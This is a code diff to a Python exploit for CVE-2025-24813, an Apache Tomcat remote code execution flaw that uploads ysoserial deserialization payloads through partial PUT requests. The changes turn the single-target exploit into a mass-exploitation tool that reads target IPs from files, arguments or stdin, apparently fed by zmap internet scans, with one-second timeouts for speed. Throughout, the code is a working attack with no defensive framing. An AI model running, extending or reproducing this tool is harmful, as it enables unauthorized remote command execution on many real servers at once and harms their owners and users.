@@ -4,18 +4,19 @@ import re
 import requests
 import subprocess
 import sys
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+try:
+    from urllib3.exceptions import InsecureRequestWarning
+    import urllib3
+    urllib3.disable_warnings(InsecureRequestWarning)
+except ImportError:
+    # Fallback for older versions
+    try:
+        from requests.packages.urllib3.exceptions import InsecureRequestWarning
+        import requests.packages.urllib3
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    except ImportError:
+        pass
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-BANNER = """
- ██████╗██╗   ██╗███████╗    ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██████╗ ███╗   ███╗ ██████╗ ██████╗████████╗    ██████╗  ██████╗███████╗
-██╔════╝██║   ██║██╔────╝    ╚════██╗██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗████╗ ████║██╔════╝ ██╔══██╗╚══██╔══╝    ██╔══██╗██╔════╝██╔════╝
-██║     ██║   ██║█████╗█████╗█████╔╝██████╔╝██████╔╝██║  ██║    ██████╔╝██████╔╝██╔████╔██║██║  ███╗██████╔╝   ██║█████╗██████╔╝██║     █████╗  
-██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔══██╗██╔══██╗██╔══██╗██║  ██║    ██╔══██╗██╔══██╗██║╚██╔╝██║██║   ██║██╔══██╗   ██║╚════╝██╔══██╗██║     ██╔══╝  
-╚██████╗ ╚████╔╝ ███████╗    ██████╔╝██║  ██║██║  ██║██████╔╝    ██████╔╝██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║   ██║     ██║  ██║╚██████╗███████╗
- ╚═════╝  ╚═══╝  ╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
-"""
 
 def remove_file(file_path):
     try:
@@ -35,7 +36,7 @@ def check_writable_servlet(target_url, host, port, verify_ssl=True):
                 "Content-Range": "bytes 0-1000/1200"
             },
             data="testdata",
-            timeout=10,
+            timeout=1,
             verify=verify_ssl
         )
         if response.status_code in [200, 201]:
@@ -113,7 +114,7 @@ def upload_and_verify_payload(target_url, host, port, session_id, payload_file, 
                     "Content-Range": "bytes 0-1000/1200"
                 },
                 data=f.read(),
-                timeout=10,
+                timeout=1,
                 verify=verify_ssl
             )
         if put_response.status_code == 409:
@@ -121,7 +122,7 @@ def upload_and_verify_payload(target_url, host, port, session_id, payload_file, 
             get_response = requests.get(
                 target_url,
                 headers={"Cookie": "JSESSIONID=absholi7ly"},
-                timeout=10,
+                timeout=1,
                 verify=verify_ssl
             )
             if get_response.status_code == 500:
@@ -142,7 +143,7 @@ def upload_and_verify_payload(target_url, host, port, session_id, payload_file, 
 
 def get_session_id(target_url, verify_ssl=True):
     try:
-        response = requests.get(f"{target_url}/index.jsp", timeout=10, verify=verify_ssl)
+        response = requests.get(f"{target_url}/index.jsp", timeout=7, verify=verify_ssl)
         if "JSESSIONID" in response.cookies:
             return response.cookies["JSESSIONID"]
         session_id = re.search(r"Session ID: (\w+)", response.text)
@@ -153,13 +154,32 @@ def get_session_id(target_url, verify_ssl=True):
             return "absholi7ly"
     except requests.RequestException as e:
         print(f"[-] Error getting session ID: {str(e)}")
-        sys.exit(1)
+        return None
 
 def check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
-    host = target_url.split("://")[1].split(":")[0] if "://" in target_url else target_url.split(":")[0]
-    port = target_url.split(":")[-1] if ":" in target_url.split("://")[-1] else "80" if "http://" in target_url else "443"
+    # Правильно извлекаем host и port из URL
+    if "://" in target_url:
+        # Формат: http://192.168.1.1:8080
+        url_part = target_url.split("://")[1]  # 192.168.1.1:8080
+        if ":" in url_part:
+            host = url_part.split(":")[0]  # 192.168.1.1
+            port = url_part.split(":")[1]  # 8080
+        else:
+            host = url_part
+            port = "80" if "http://" in target_url else "443"
+    else:
+        # Формат: 192.168.1.1:8080
+        if ":" in target_url:
+            host = target_url.split(":")[0]
+            port = target_url.split(":")[1]
+        else:
+            host = target_url
+            port = "80"
 
     session_id = get_session_id(target_url, verify_ssl)
+    if session_id is None:
+        print(f"[-] Skipping target {target_url} due to connection issues")
+        return
     print(f"[*] Session ID: {session_id}")
 
     if check_writable_servlet(target_url, host, port, verify_ssl):
@@ -179,10 +199,47 @@ def check_target(target_url, command, ysoserial_path, gadget, payload_type, veri
 
         remove_file(payload_file)
 
+def process_targets_from_stdin(port, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
+    """Читает IP адреса из stdin и проверяет каждый"""
+    print(f"[*] Reading targets from stdin on port {port}...")
+    try:
+        for line in sys.stdin:
+            ip = line.strip()
+            if ip:
+                # Формируем URL с портом
+                target_url = f"http://{ip}:{port}"
+                print(f"\n[*] Testing {target_url}")
+                try:
+                    check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
+                except Exception as e:
+                    print(f"[-] Error testing {target_url}: {str(e)}")
+                    continue
+    except KeyboardInterrupt:
+        print(f"\n[*] Interrupted by user")
+    except EOFError:
+        print(f"[*] Finished reading from stdin")
+
+def process_targets_from_list(targets, port, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
+    """Обрабатывает список целей"""
+    for target in targets:
+        # Если это просто IP, добавляем протокол и порт
+        if not target.startswith(('http://', 'https://')):
+            target_url = f"http://{target}:{port}"
+        else:
+            target_url = target
+
+        print(f"\n[*] Testing {target_url}")
+        try:
+            check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
+        except Exception as e:
+            print(f"[-] Error testing {target_url}: {str(e)}")
+            continue
+
 def main():
-    print(BANNER)
     parser = argparse.ArgumentParser(description="CVE-2025-24813 Apache Tomcat RCE Exploit")
-    parser.add_argument("target", help="Target URL (e.g., http://localhost:8081 or https://example.com)")
+    parser.add_argument("port", help="Port to scan (e.g., 8080, 80, 443)")
+    parser.add_argument("--targets", nargs="*", help="Specific target IPs or URLs")
+    parser.add_argument("--file", help="File with target IPs (one per line)")
     parser.add_argument("--command", default="calc.exe", help="Command to execute")
     parser.add_argument("--ysoserial", default="ysoserial.jar", help="Path to ysoserial.jar")
     parser.add_argument("--gadget", default="CommonsCollections6", help="ysoserial gadget chain")
@@ -190,7 +247,24 @@ def main():
     parser.add_argument("--no-ssl-verify", action="store_false", help="Disable SSL verification")
     args = parser.parse_args()
 
-    check_target(args.target, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
+    # Проверяем источник целей
+    if args.targets:
+        # Используем цели из командной строки
+        print(f"[*] Using targets from command line: {args.targets}")
+        process_targets_from_list(args.targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
+    elif args.file:
+        # Читаем из файла
+        try:
+            with open(args.file, 'r') as f:
+                targets = [line.strip() for line in f if line.strip()]
+            print(f"[*] Loaded {len(targets)} targets from {args.file}")
+            process_targets_from_list(targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
+        except FileNotFoundError:
+            print(f"[-] File not found: {args.file}")
+            sys.exit(1)
+    else:
+        # Читаем из stdin (для работы с zmap)
+        process_targets_from_stdin(args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
 
 if __name__ == "__main__":
     main()
